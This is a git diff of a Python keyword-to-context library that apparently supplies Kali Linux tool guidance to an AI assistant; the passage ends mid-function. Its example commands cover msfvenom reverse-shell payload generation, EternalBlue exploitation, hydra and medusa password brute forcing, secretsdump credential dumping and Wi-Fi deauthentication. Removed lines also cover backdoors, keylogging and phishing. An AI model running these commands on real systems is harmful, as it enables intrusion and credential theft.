@@ -1,325 +1,468 @@
 #!/usr/bin/env python3
 # PAW Context Library
-# Provides contextual information about Kali Linux tools based on keywords in prompts
+# Provides context for user prompts based on keywords
 
 import re
-from typing import Dict, List, Set, Optional
+from typing import Optional, Dict, List, Any
 
-# Tool dictionary with contextual information
-TOOL_CONTEXTS = {
+# Import prompts
+try:
+    from prompts_lib import AIRCRACK_PROMPTS, NETWORK_PROMPTS
+except ImportError:
+    # Fallback defaults if prompts_lib isn't available
+    AIRCRACK_PROMPTS = {
+        "general": "The aircrack-ng suite is a set of tools for auditing wireless security."
+    }
+    NETWORK_PROMPTS = {
+        "general": "Network tools help with discovery and analysis of networks."
+    }
+
+# Kali Linux tools information
+KALI_TOOLS = {
+    # Wireless tools
+    "aircrack-ng": {
+        "description": "Complete suite for auditing wireless networks. Used for cracking WEP and WPA-PSK keys.",
+        "commands": ["aircrack-ng", "airdecap-ng", "airdecloak-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "airbase-ng", "airolib-ng", "airserv-ng", "airtun-ng"],
+        "main_options": "-b (BSSID), -a (attack mode), -w (wordlist), -e (ESSID)",
+        "examples": ["aircrack-ng -w wordlist.txt capture.cap", "aircrack-ng -b 00:11:22:33:44:55 -w wordlist.txt capture.cap"]
+    },
+    "airmon-ng": {
+        "description": "Script for placing wireless adapters into monitor mode",
+        "main_options": "check, check kill, start, stop",
+        "examples": ["airmon-ng", "airmon-ng check kill", "airmon-ng start wlan0", "airmon-ng stop wlan0mon"]
+    },
+    "airodump-ng": {
+        "description": "Wireless packet capture tool, used for capturing 802.11 frames for later use with aircrack-ng",
+        "main_options": "--bssid (target AP), -c (channel), -w (write to file), --essid (target network)",
+        "examples": ["airodump-ng wlan0mon", "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon"]
+    },
+    "aireplay-ng": {
+        "description": "Tool for wireless packet injection, used to generate traffic for later use with aircrack-ng",
+        "main_options": "-0 (deauth), -1 (fake auth), -2 (interactive replay), -3 (ARP replay)",
+        "examples": ["aireplay-ng -0 10 -a [AP MAC] -c [CLIENT MAC] wlan0mon", "aireplay-ng -1 0 -e [ESSID] -a [AP MAC] wlan0mon"]
+    },
+    "wifite": {
+        "description": "Automated wireless attack tool designed to simplify wireless auditing",
+        "main_options": "-wep (attack WEP), -wpa (attack WPA), -i (interface)",
+        "examples": ["wifite", "wifite -i wlan0mon", "wifite --crack -i wlan0mon"]
+    },
+    "reaver": {
+        "description": "Tool for brute force attacks against WPS (Wi-Fi Protected Setup)",
+        "main_options": "-i (interface), -b (BSSID), -c (channel), -vv (verbose)",
+        "examples": ["reaver -i wlan0mon -b 00:11:22:33:44:55 -vv", "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv"]
+    },
+    "bully": {
+        "description": "WPS brute force attack tool, alternative to reaver",
+        "main_options": "-b (BSSID), -c (channel), -l (lockout wait)",
+        "examples": ["bully -b 00:11:22:33:44:55 -c 6 wlan0mon"]
+    },
+    "fern-wifi-cracker": {
+        "description": "GUI-based wireless security auditing tool",
+        "examples": ["fern-wifi-cracker"]
+    },
+    "kismet": {
+        "description": "Wireless network detector, sniffer, and IDS",
+        "examples": ["kismet -c wlan0mon"]
+    },
+    
     # Network scanning and enumeration
-    "scan": "Consider using nmap for network scanning. Options: -sS (SYN scan), -sV (version detection), -sC (default scripts), -p- (all ports), -A (aggressive scan with OS detection).",
-    "port scan": "Use nmap for port scanning. For quick scans: nmap -F (fast), for stealth: -sS, for comprehensive: -sV -sC -p-",
-    "network scan": "Use nmap for network scanning or netdiscover for ARP-based discovery.",
-    "discover hosts": "Use netdiscover, nmap with -sn flag, or arp-scan for host discovery on a network.",
-    "enumerate": "Consider tools like enum4linux for Windows/Samba, nikto for web servers, or nmap scripts with --script=vuln.",
-    "open ports": "Use nmap or masscan for finding open ports. nmap is more feature-rich, while masscan is faster for large networks.",
+    "nmap": {
+        "description": "Network exploration and security auditing tool",
+        "main_options": "-sS (SYN scan), -sV (version detection), -O (OS detection), -p (ports), -A (aggressive), -T(1-5) (timing)",
+        "examples": ["nmap 192.168.1.1", "nmap -sS -sV -p 1-1000 192.168.1.0/24", "nmap -A -T4 scanme.nmap.org"]
+    },
+    "masscan": {
+        "description": "Fast TCP port scanner, spins up multiple TCP SYN packets in a very short time",
+        "main_options": "-p (ports), --rate (packets per second)",
+        "examples": ["masscan -p 80,443 192.168.1.0/24", "masscan -p 1-65535 --rate 10000 192.168.1.0/24"]
+    },
+    "netdiscover": {
+        "description": "Active/passive ARP reconnaissance tool to discover hosts on local network",
+        "main_options": "-r (range), -i (interface), -p (passive mode)",
+        "examples": ["netdiscover -r 192.168.1.0/24", "netdiscover -i eth0 -r 192.168.1.0/24"]
+    },
+    "hping3": {
+        "description": "Command-line oriented TCP/IP packet assembler/analyzer",
+        "main_options": "-S (SYN), -A (ACK), -F (FIN), -p (port)",
+        "examples": ["hping3 -S -p 80 -c 5 target.com", "hping3 --scan 1-100 -S target.com"]
+    },
+    "dnsenum": {
+        "description": "Tool to enumerate DNS information about domains and to discover non-contiguous IP blocks",
+        "main_options": "-d (domain), -f (wordlist)",
+        "examples": ["dnsenum domain.com", "dnsenum --threads 50 -f wordlist.txt domain.com"]
+    },
+    "fierce": {
+        "description": "DNS reconnaissance tool for locating non-contiguous IP space",
+        "main_options": "-dns (domain)",
+        "examples": ["fierce -dns domain.com"]
+    },
     
-    # Nmap specific options
-    "nmap": "Network mapper tool. Key options: -sS (SYN scan), -sT (TCP connect), -sU (UDP), -sV (version detection), -O (OS detection), -A (aggressive), -p (ports), -T(0-5) (timing), --script (NSE scripts).",
-    "os detection": "Use nmap with -O for operating system detection. For better results, combine with -sV or -A flags.",
-    "service detection": "For service/version detection use nmap -sV. Add --version-intensity (0-9) to control intensity, -sV --version-all for maximum detection.",
-    "firewall": "Nmap firewall evasion: -f (fragment packets), --mtu (specify MTU), -D (decoy scan), --source-port (specify source port), --data-length (add random data).",
-    "nmap timing": "Control nmap speed with -T(0-5): -T0 (paranoid), -T1 (sneaky), -T2 (polite), -T3 (normal), -T4 (aggressive), -T5 (insane).",
-    "script scan": "Use nmap with --script flag. Common categories: default, discovery, safe, vuln, exploit, auth, brute. Example: --script=vuln",
-    "vulnerability scan": "Run nmap with --script=vuln to check for known vulnerabilities, or -A for a comprehensive scan including vulnerabilities.",
+    # Vulnerability scanning and exploitation
+    "metasploit": {
+        "description": "Penetration testing framework with exploit database, used for developing and executing exploits",
+        "commands": ["msfconsole", "msfvenom", "msfdb"],
+        "examples": ["msfconsole", "msfdb init", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe"]
+    },
+    "msfconsole": {
+        "description": "Main interface to the Metasploit Framework",
+        "main_commands": "search, use, set, show options, exploit/run, sessions",
+        "examples": ["msfconsole", "search type:exploit platform:windows name:smb", "use exploit/windows/smb/ms17_010_eternalblue", "set RHOSTS 192.168.1.10", "exploit"]
+    },
+    "msfvenom": {
+        "description": "Payload generator and encoder for the Metasploit Framework",
+        "main_options": "-p (payload), LHOST, LPORT, -f (format), -o (output)",
+        "examples": ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe"]
+    },
+    "sqlmap": {
+        "description": "Automated SQL injection and database takeover tool",
+        "main_options": "-u (URL), --data (POST data), --dbs (databases), --tables, --dump",
+        "examples": ["sqlmap -u 'http://example.com/page.php?id=1'", "sqlmap -u 'http://example.com/login.php' --data 'username=test&password=test' --dbs"]
+    },
+    "nikto": {
+        "description": "Web server scanner that tests for dangerous files/CGIs, outdated server software and other issues",
+        "main_options": "-h (host), -p (port), -ssl (use SSL)",
+        "examples": ["nikto -h example.com", "nikto -h example.com -p 443 -ssl"]
+    },
+    "gobuster": {
+        "description": "Directory/file and DNS busting tool written in Go",
+        "main_options": "dir -u (URL) -w (wordlist), dns -d (domain) -w (wordlist)",
+        "examples": ["gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt", "gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt"]
+    },
+    "dirb": {
+        "description": "Web content scanner that looks for hidden web objects using a dictionary",
+        "main_options": "(URL) (wordlist), -o (output), -r (non-recursive)",
+        "examples": ["dirb http://example.com", "dirb http://example.com /usr/share/wordlists/dirb/common.txt"]
+    },
+    "dirbuster": {
+        "description": "GUI-based application designed to brute force directories and files on web servers",
+        "examples": ["dirbuster"]
+    },
     
-    # Metasploit specific
-    "metasploit": "Exploitation framework. Use 'msfconsole' to start. Key commands: search (find modules), use (select module), set/unset (configure options), exploit/run (execute), sessions (manage targets).",
-    "msfvenom": "Use msfvenom to create payloads. Syntax: msfvenom -p [payload] LHOST=[IP] LPORT=[port] -f [format]. Common formats: exe, elf, raw, python, ruby, perl, dll.",
-    "reverse shell": "Generate reverse shells using msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your IP] LPORT=[port] -f exe > shell.exe",
-    "bind shell": "Create bind shells with msfvenom: msfvenom -p windows/meterpreter/bind_tcp RHOST=[target] LPORT=[port] -f exe > shell.exe",
-    "meterpreter": "Advanced payload in Metasploit. Commands: sysinfo, getuid, getsystem, ps, migrate, hashdump, search, download, upload, shell, webcam_snap, keyscan_start.",
-    "msf database": "Use 'msfdb init' to setup the database. In msfconsole, use 'db_nmap' to save scan results directly to the database. Use 'hosts' and 'services' to view data.",
-    "brute force metasploit": "Use auxiliary modules like: use auxiliary/scanner/ssh/ssh_login, set RHOSTS, set USERNAME, set PASS_FILE, set THREADS, run.",
-    "metasploit listeners": "Set up a listener: use multi/handler, set PAYLOAD, set LHOST/LPORT, exploit -j (run as job).",
-    "metasploit sessions": "Manage sessions with: sessions -l (list), sessions -i [id] (interact), sessions -u [id] (upgrade to meterpreter), sessions -k [id] (kill).",
-    "staged payload": "Staged payloads (windows/meterpreter/reverse_tcp) are smaller but need handler. Stageless (windows/meterpreter_reverse_tcp) are larger but more reliable.",
+    # Password attacking
+    "hydra": {
+        "description": "Fast and flexible online password cracking tool that supports numerous protocols",
+        "main_options": "-l (username), -L (username list), -p (password), -P (password list), -t (threads)",
+        "examples": ["hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10", "hydra -L users.txt -P pass.txt ftp://192.168.1.10"]
+    },
+    "john": {
+        "description": "Active password cracking tool, designed to detect weak Unix passwords",
+        "main_options": "--wordlist (wordlist), --format (hash type), --rules (rule set)",
+        "examples": ["john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "john --format=raw-md5 hashes.txt"]
+    },
+    "hashcat": {
+        "description": "Advanced password recovery utility with support for many hash types",
+        "main_options": "-m (hash type), -a (attack mode), -o (output file)",
+        "examples": ["hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt", "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a"]
+    },
+    "crunch": {
+        "description": "Tool for creating wordlists with specific patterns",
+        "main_options": "(min length) (max length) (character set)",
+        "examples": ["crunch 8 8 0123456789ABCDEF -o wordlist.txt", "crunch 4 6 abc123"]
+    },
+    "medusa": {
+        "description": "High-speed, parallel network login auditor",
+        "main_options": "-h (host), -u (user), -p (password), -P (password list), -M (module)",
+        "examples": ["medusa -h 192.168.1.10 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh"]
+    },
     
-    # Wireless testing
-    "wifi": "Consider using aircrack-ng suite, particularly airmon-ng, airodump-ng, and aireplay-ng for WiFi testing.",
-    "wireless": "Use aircrack-ng suite for wireless network testing or wifite for automated wireless auditing.",
-    "bluetooth": "Consider using tools like bluez, btscanner, or bluesnarfer for Bluetooth scanning and testing.",
-    "deauth": "Use aireplay-ng with the -0 option for deauthentication attacks.",
-    "wpa": "Use aircrack-ng suite, specifically airmon-ng, airodump-ng, and aircrack-ng for WPA handshake capture and cracking.",
-    
-    # Aircrack-ng suite detailed options
-    "aircrack-ng": "WiFi password cracking tool. Syntax: aircrack-ng [options] <capture file(s)>. Common options: -a (force attack mode), -b (BSSID), -w (wordlist), -e (ESSID).",
-    "airmon-ng": "Tool to manage wireless interfaces. Commands: airmon-ng (list interfaces), airmon-ng check kill (kill interfering processes), airmon-ng start wlan0 (start monitor mode), airmon-ng stop wlan0mon (stop monitor mode).",
-    "airodump-ng": "Wireless packet capture tool. Syntax: airodump-ng [options] interface. Key options: --bssid (target AP), --channel (set channel), -w (write capture), --output-format (cap/csv/kismet/etc), --essid (target network name).",
-    "aireplay-ng": "Packet injection tool. Common attacks: -0 (deauth), -1 (fake auth), -2 (interactive packet replay), -3 (ARP request replay). Syntax: aireplay-ng -0 10 -a [BSSID] -c [clientMAC] wlan0mon",
-    "monitor mode": "To enable monitor mode: airmon-ng check kill, then airmon-ng start wlan0. Interface typically becomes wlan0mon.",
-    "wps attack": "For WPS attacks, use tools like reaver or bully. Example: reaver -i wlan0mon -b [BSSID] -vv",
-    "wifi capture": "To capture handshakes: airodump-ng -c [channel] --bssid [BSSID] -w [filename] wlan0mon, then in another terminal: aireplay-ng -0 10 -a [BSSID] -c [clientMAC] wlan0mon",
-    "pmkid attack": "For PMKID attacks: hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
-    "handshake": "To verify a capture contains a handshake: aircrack-ng -J [outfile] [capturefile], or use wireshark to inspect the capture.",
-    "wep crack": "For WEP cracking: airodump-ng -c [channel] --bssid [BSSID] -w [file] wlan0mon, then aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [yourMAC] wlan0mon, followed by aireplay-ng -3 -b [BSSID] -h [yourMAC] wlan0mon.",
-    "wifi analysis": "For general WiFi analysis, use airodump-ng wlan0mon. For a more user-friendly tool, try kismet.",
-    "airodump filters": "Filter airodump-ng captures with: --essid (network name), --bssid (AP MAC), --channel (specific channel), --encrypt (encryption type: WEP, WPA, OPN).",
-    
-    # MAC address manipulation
-    "mac changer": "Use macchanger to spoof/modify MAC addresses. Syntax: macchanger [options] interface. Common options: -r (random MAC), -A (random vendor MAC), -e (keep vendor bytes), -m XX:XX:XX:XX:XX:XX (specific MAC).",
-    "macchanger": "MAC address manipulation tool. First disable the interface: ifconfig eth0 down, then use macchanger -r eth0 (random MAC) or macchanger -m 00:11:22:33:44:55 eth0 (specific MAC), then ifconfig eth0 up to reactivate.",
-    "change mac": "To change MAC address: (1) ifconfig interface down (2) macchanger -r interface (random) or macchanger -m XX:XX:XX:XX:XX:XX interface (specific) (3) ifconfig interface up",
-    "spoof mac": "To spoof MAC address use macchanger. Disable interface first with ifconfig wlan0 down, then macchanger -r wlan0 for random MAC or macchanger -A wlan0 for random vendor MAC. Re-enable with ifconfig wlan0 up.",
-    "fake mac": "Use macchanger to set fake MAC. First ifconfig eth0 down, then macchanger -r eth0 (random) or -a (same kind) or -A (any vendor) or -m 00:11:22:33:44:55 (specific), then ifconfig eth0 up.",
-    "mac address": "View current MAC: macchanger -s interface. Change MAC: (1) ifconfig interface down (2) macchanger -r/-a/-m interface (3) ifconfig interface up.",
-    "vendor mac": "List vendor MACs with: macchanger -l. Change to random vendor MAC: macchanger -a interface (same kind of device) or macchanger -A interface (any vendor).",
-    "permanent mac": "To reset to original hardware MAC: ifconfig interface down, then macchanger -p interface, then ifconfig interface up.",
-    "random mac": "For random MAC: ifconfig interface down, macchanger -r interface, ifconfig interface up. For random vendor MAC: macchanger -A interface.",
+    # Sniffing and spoofing
+    "wireshark": {
+        "description": "Network protocol analyzer with a GUI, used for deep inspection of hundreds of protocols",
+        "examples": ["wireshark"]
+    },
+    "tshark": {
+        "description": "Command-line version of Wireshark, for capturing and displaying packets",
+        "main_options": "-i (interface), -w (write to file), -r (read from file)",
+        "examples": ["tshark -i eth0", "tshark -r capture.pcap -Y 'http'"]
+    },
+    "tcpdump": {
+        "description": "Command-line packet analyzer",
+        "main_options": "-i (interface), -w (write to file), -r (read from file)",
+        "examples": ["tcpdump -i eth0", "tcpdump -i eth0 -w capture.pcap", "tcpdump -r capture.pcap 'port 80'"]
+    },
+    "ettercap": {
+        "description": "Comprehensive suite for MITM attacks, featuring sniffing, content filtering and more",
+        "main_options": "-T (text mode), -G (GUI mode), -M (MITM method)",
+        "examples": ["ettercap -G", "ettercap -T -q -M arp:remote /192.168.1.1/ /192.168.1.10-20/"]
+    },
+    "bettercap": {
+        "description": "Swiss army knife for network attacks and monitoring",
+        "main_options": "-iface (interface), -eval (commands to execute)",
+        "examples": ["bettercap -iface eth0", "bettercap -iface eth0 -eval 'net.probe on'"]
+    },
+    "responder": {
+        "description": "LLMNR, NBT-NS and MDNS poisoner",
+        "main_options": "-I (interface), -A (analyze mode), -w (start web server)",
+        "examples": ["responder -I eth0", "responder -I eth0 -w -r -f"]
+    },
+    "macchanger": {
+        "description": "Utility for manipulating MAC addresses",
+        "main_options": "-r (random MAC), -a (same vendor), -m (specific MAC)",
+        "examples": ["macchanger -r eth0", "macchanger -m 00:11:22:33:44:55 eth0", "macchanger -p eth0 (reset to original)"]
+    },
     
     # Web application testing
-    "web scan": "Consider using nikto for web server scanning or dirb/dirbuster/gobuster for directory discovery.",
-    "directory scan": "Use dirb, dirbuster, gobuster, or wfuzz for web directory and file discovery/brute-forcing.",
-    "website": "Consider tools like nikto, dirbuster, or sqlmap depending on the specific website testing needs.",
-    "sql injection": "Use sqlmap for automated SQL injection detection and exploitation.",
-    "xss": "Use XSSer or XSStrike for cross-site scripting vulnerability scanning and exploitation.",
-    
-    # Password attacks
-    "password": "Consider tools like hydra for online password attacks or john/hashcat for offline password cracking.",
-    "crack": "Use john (John the Ripper) or hashcat for password cracking. hashcat is generally faster for GPU-accelerated attacks.",
-    "brute force": "Use hydra for online service brute forcing or john/hashcat for offline password attacks.",
-    "dictionary attack": "Use tools like hydra with a wordlist for online attacks or john/hashcat for offline attacks.",
-    "wordlist": "Consider using built-in wordlists in /usr/share/wordlists or tools like crunch to generate custom wordlists.",
-    
-    # Exploitation
-    "exploit": "Consider using Metasploit Framework (msfconsole) for exploitation.",
-    "payload": "Generate payloads using msfvenom from the Metasploit Framework.",
-    "backdoor": "Consider using msfvenom for payload generation or the persistence modules in Metasploit.",
-    
-    # Sniffing & MITM
-    "capture": "Use tcpdump or Wireshark for packet capture and analysis.",
-    "sniff": "Use Wireshark or tcpdump for packet sniffing, or specialized tools like ettercap for MITM attacks.",
-    "mitm": "Consider ettercap or bettercap for Man-in-the-Middle attacks.",
-    "arp spoof": "Use arpspoof from dsniff package or ettercap for ARP spoofing attacks.",
-    "packet": "Use tcpdump or Wireshark for packet capture and analysis.",
-    
-    # Social Engineering
-    "phishing": "Consider using Social Engineering Toolkit (SET) or GoPhish for phishing campaigns.",
-    "social engineering": "Use the Social Engineering Toolkit (SET) with various attack vectors.",
-    
-    # Forensics
-    "forensic": "Consider tools like Autopsy, dd, or testdisk depending on the forensic task.",
-    "recover": "Use tools like testdisk, photorec, or foremost for file recovery.",
-    "memory dump": "Use Volatility for memory forensics and analysis.",
-    "analyze": "Consider tools specific to what needs to be analyzed - Wireshark for packets, binwalk for binaries, etc.",
-    
-    # Steganography
-    "steg": "Consider tools like steghide, outguess, or stegdetect for steganography.",
-    "hide": "Use steghide for hiding data in images or audio files.",
-    "extract": "Use binwalk for extracting embedded files or steghide for extracting hidden data from stego files.",
-    
-    # Information gathering
-    "recon": "Consider tools like whois, dmitry, theHarvester, or recon-ng for reconnaissance.",
-    "dns": "Use tools like dig, nslookup, dnsenum, or fierce for DNS enumeration.",
-    "whois": "Use whois command for domain registration information.",
-    "footprint": "Consider tools like dmitry, recon-ng, or osint-framework for footprinting.",
+    "burpsuite": {
+        "description": "Integrated platform for web application security testing",
+        "examples": ["burpsuite"]
+    },
+    "owasp-zap": {
+        "description": "Integrated tool for finding vulnerabilities in web applications",
+        "examples": ["owasp-zap"]
+    },
+    "wpscan": {
+        "description": "WordPress security scanner",
+        "main_options": "--url (target URL), --enumerate (enumeration mode)",
+        "examples": ["wpscan --url http://wordpress.example.com", "wpscan --url http://wordpress.example.com --enumerate u"]
+    },
+    "ffuf": {
+        "description": "Fast web fuzzer written in Go",
+        "main_options": "-u (URL with FUZZ keyword), -w (wordlist)",
+        "examples": ["ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt"]
+    },
     
     # Post-exploitation
-    "privilege escalation": "Use tools like LinPEAS, WinPEAS, or unix-privesc-check for privilege escalation.",
-    "post exploitation": "Consider using Metasploit post modules or PowerSploit for post-exploitation.",
-    "lateral movement": "Consider using tools like proxychains, port forwarding techniques, or Pass-the-Hash attacks.",
+    "impacket": {
+        "description": "Collection of Python classes for working with network protocols",
+        "commands": ["impacket-secretsdump", "impacket-smbclient", "impacket-wmiexec", "impacket-psexec"],
+        "examples": ["impacket-secretsdump domain/user:password@192.168.1.10", "impacket-psexec domain/user:password@192.168.1.10"]
+    },
+    "powershell-empire": {
+        "description": "Post-exploitation framework with a focus on Windows targets",
+        "examples": ["powershell-empire"]
+    },
+    "mimikatz": {
+        "description": "Tool to extract plaintexts passwords, hashes, and Kerberos tickets from memory",
+        "examples": ["mimikatz"]
+    },
     
-    # Anonymity and privacy
-    "anonymous": "Consider using tools like Tor, proxychains, or anonsurf for anonymity.",
-    "tor": "Use Tor Browser or proxychains with tor for anonymous browsing/connections.",
-    "vpn": "Set up OpenVPN or similar VPN services for encrypted communications.",
+    # Forensics
+    "autopsy": {
+        "description": "Digital forensics platform for disk image analysis",
+        "examples": ["autopsy"]
+    },
+    "foremost": {
+        "description": "Data carving tool that recovers files based on their headers and footers",
+        "main_options": "-t (file types), -i (input file), -o (output directory)",
+        "examples": ["foremost -i disk.img -o recovered", "foremost -t jpg,pdf,doc -i disk.img"]
+    },
+    "binwalk": {
+        "description": "Tool for searching binary files for embedded files and executable code",
+        "main_options": "-e (extract), -B (binary greppable output), -M (magic scan)",
+        "examples": ["binwalk firmware.bin", "binwalk -e firmware.bin"]
+    },
+    "volatility": {
+        "description": "Memory forensics framework",
+        "main_options": "-f (memory image), --profile (OS profile), [plugin]",
+        "examples": ["vol.py -f memory.dmp imageinfo", "vol.py -f memory.dmp --profile=Win10x64 pslist"]
+    },
     
-    # Mobile testing
-    "android": "Consider using tools like adb, apktool, or drozer for Android application testing.",
-    "ios": "Use tools specific to iOS testing depending on the specific task.",
+    # Information gathering
+    "theharvester": {
+        "description": "Tool for gathering emails, subdomains, hosts, employee names, open ports from public sources",
+        "main_options": "-d (domain), -l (limit results), -b (data source)",
+        "examples": ["theharvester -d example.com -b all", "theharvester -d example.com -b google,bing,linkedin"]
+    },
+    "recon-ng": {
+        "description": "Full-featured web reconnaissance framework",
+        "examples": ["recon-ng"]
+    },
+    "maltego": {
+        "description": "Interactive data mining tool for relationship mapping",
+        "examples": ["maltego"]
+    },
+    "osint-framework": {
+        "description": "Collection of OSINT (Open Source Intelligence) tools",
+        "examples": ["Open source tools for various OSINT activities"]
+    },
+    
+    # Steganography
+    "steghide": {
+        "description": "Tool that hides data in various kinds of image and audio files",
+        "main_options": "embed -ef (file to hide) -cf (cover file), extract -sf (stego file)",
+        "examples": ["steghide embed -ef secret.txt -cf image.jpg", "steghide extract -sf image.jpg"]
+    },
+    "stegosuite": {
+        "description": "Steganography tool with GUI for hiding data in image files",
+        "examples": ["stegosuite"]
+    },
     
     # Reporting
-    "report": "Consider tools like dradis, faraday, or simple templates with markdown or LaTeX for reporting.",
-    "document": "Use tools like dradis for collaborative documentation or standard office tools with templates.",
-    
-    # Other specialized tasks
-    "fuzz": "Consider tools like wfuzz, ffuf, or AFL for fuzzing applications.",
-    "reverse engineer": "Use tools like Ghidra, radare2, or IDA Pro for reverse engineering.",
-    "disassemble": "Use Ghidra, radare2, or objdump for disassembling binaries.",
-}
-
-# Groups for tool categories 
-TOOL_CATEGORIES = {
-    "scanning": ["nmap", "masscan", "netdiscover", "arp-scan"],
-    "web": ["nikto", "dirb", "dirbuster", "gobuster", "wfuzz", "sqlmap", "burpsuite", "owasp zap"],
-    "wireless": ["aircrack-ng", "wifite", "kismet", "reaver", "bully"],
-    "password": ["hydra", "john", "hashcat", "crunch", "medusa"],
-    "exploitation": ["metasploit", "msfconsole", "msfvenom", "exploit-db", "searchsploit"],
-    "sniffing": ["wireshark", "tcpdump", "ettercap", "bettercap", "tshark"],
-    "forensics": ["autopsy", "volatility", "binwalk", "foremost", "testdisk", "photorec"],
-    "information": ["whois", "recon-ng", "theharvester", "dnsenum", "fierce", "dmitry"],
-    "anonymity": ["tor", "proxychains", "anonsurf", "macchanger"],
+    "dradis": {
+        "description": "Collaborative reporting platform for IT security assessments",
+        "examples": ["dradis"]
+    },
+    "faraday": {
+        "description": "Collaborative penetration test and vulnerability management platform",
+        "examples": ["faraday"]
+    }
 }
 
 def get_context_for_prompt(prompt: str, previous_output: Optional[str] = None) -> Optional[str]:
     """
-    Analyze the prompt and return relevant context about Kali Linux tools.
+    Get contextual information based on keyword matching from user prompt
     
     Args:
-        prompt: The user's natural language prompt
-        previous_output: Optional output from a previous command to provide context
+        prompt: The user's input prompt
+        previous_output: Optional output from previous command
         
     Returns:
-        String with contextual information about relevant tools, or None if no matches
+        Context information as a formatted string, or None if no context found
     """
-    # Convert prompt to lowercase for case-insensitive matching
-    prompt_lower = prompt.lower()
+    prompt = prompt.lower()
     
-    # Find matching contexts
-    contexts = []
+    # First check for exact tool mentions in Kali tools
+    for tool_name, tool_info in KALI_TOOLS.items():
+        if tool_name.lower() in prompt:
+            return format_kali_tool_info(tool_name, tool_info)
     
-    # Check for exact phrases (multi-word keys)
-    for key, context in sorted(TOOL_CONTEXTS.items(), key=lambda x: len(x[0]), reverse=True):
-        if len(key.split()) > 1 and key.lower() in prompt_lower:
-            contexts.append(context)
+    # Check for specific aircrack tools first (direct mentions)
+    if "airmon-ng" in prompt and "airmon-ng" in AIRCRACK_PROMPTS:
+        return format_tool_info("airmon-ng", AIRCRACK_PROMPTS["airmon-ng"])
     
-    # Check for individual keywords
-    for key, context in TOOL_CONTEXTS.items():
-        # Skip multi-word keys (already checked)
-        if len(key.split()) > 1:
-            continue
-            
-        # Match on word boundaries to avoid partial matches
-        if re.search(r'\b' + re.escape(key.lower()) + r'\b', prompt_lower):
-            contexts.append(context)
+    if "airodump-ng" in prompt and "airodump-ng" in AIRCRACK_PROMPTS:
+        return format_tool_info("airodump-ng", AIRCRACK_PROMPTS["airodump-ng"])
     
-    # Handle specific tool mentions - add detailed info if a specific tool is mentioned
-    tool_info = {}
-    for tool in _extract_specific_tools(prompt_lower):
-        info = _get_tool_specific_info(tool)
-        if info:
-            tool_info[tool] = info
+    if "aireplay-ng" in prompt and "aireplay-ng" in AIRCRACK_PROMPTS:
+        return format_tool_info("aireplay-ng", AIRCRACK_PROMPTS["aireplay-ng"])
     
-    # Combine contexts, removing duplicates while preserving order
-    unique_contexts = []
-    for context in contexts:
-        if context not in unique_contexts:
-            unique_contexts.append(context)
+    if "aircrack-ng" in prompt and "aircrack-ng" in AIRCRACK_PROMPTS:
+        return format_tool_info("aircrack-ng", AIRCRACK_PROMPTS["aircrack-ng"])
     
-    # Add tool-specific information
-    for tool, info in tool_info.items():
-        unique_contexts.append(f"Tool '{tool}': {info}")
-    
-    # Add context based on previous output if provided
-    if previous_output:
-        prev_context = _analyze_previous_output(previous_output, prompt_lower)
-        if prev_context:
-            unique_contexts.append(f"Based on previous output: {prev_context}")
-    
-    # Return combined context or None if empty
-    if unique_contexts:
-        return " ".join(unique_contexts)
-    return None
-
-def _analyze_previous_output(output: str, current_prompt: str) -> Optional[str]:
-    """
-    Analyze previous command output to provide additional context for current prompt.
-    
-    Args:
-        output: Output from a previous command
-        current_prompt: Current user prompt in lowercase
-        
-    Returns:
-        String with contextual information derived from previous output, or None
-    """
-    context = None
-    
-    # Check for MAC addresses in the output
-    if "mac" in current_prompt or "macchanger" in current_prompt:
-        mac_matches = re.findall(r'([0-9A-F]{2}(?::[0-9A-F]{2}){5})', output, re.IGNORECASE)
-        if mac_matches:
-            context = f"Found MAC address(es) in previous output: {', '.join(mac_matches[:3])}"
-            if len(mac_matches) > 3:
-                context += f" and {len(mac_matches) - 3} more"
-    
-    # Check for IP addresses in the output 
-    if "ip" in current_prompt or "network" in current_prompt or "scan" in current_prompt:
-        ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', output)
-        if ip_matches:
-            context = f"Found IP address(es) in previous output: {', '.join(ip_matches[:3])}"
-            if len(ip_matches) > 3:
-                context += f" and {len(ip_matches) - 3} more"
-    
-    # Check for wireless networks in airodump-ng style output
-    if "wifi" in current_prompt or "wireless" in current_prompt or "airodump" in current_prompt:
-        bssid_matches = re.findall(r'([0-9A-F]{2}(?::[0-9A-F]{2}){5})\s+', output, re.IGNORECASE)
-        if bssid_matches:
-            context = f"Found wireless networks in previous output with BSSIDs: {', '.join(bssid_matches[:3])}"
-            if len(bssid_matches) > 3:
-                context += f" and {len(bssid_matches) - 3} more"
-    
-    # Check for open ports in nmap-style output
-    if "port" in current_prompt or "nmap" in current_prompt or "service" in current_prompt:
-        port_matches = re.findall(r'(\d+)\/(?:tcp|udp)\s+open', output, re.IGNORECASE)
-        if port_matches:
-            context = f"Found open port(s) in previous output: {', '.join(port_matches[:5])}"
-            if len(port_matches) > 5:
-                context += f" and {len(port_matches) - 5} more"
-    
-    return context
-
-def _extract_specific_tools(prompt_lower: str) -> List[str]:
-    """Extract specific tool names mentioned in the prompt."""
-    tools = []
-    
-    # Common Kali tools to check for explicit mentions
-    common_tools = [
-        "nmap", "metasploit", "aircrack-ng", "hydra", "hashcat", "john", 
-        "wireshark", "sqlmap", "burpsuite", "nikto", "gobuster", "dirb",
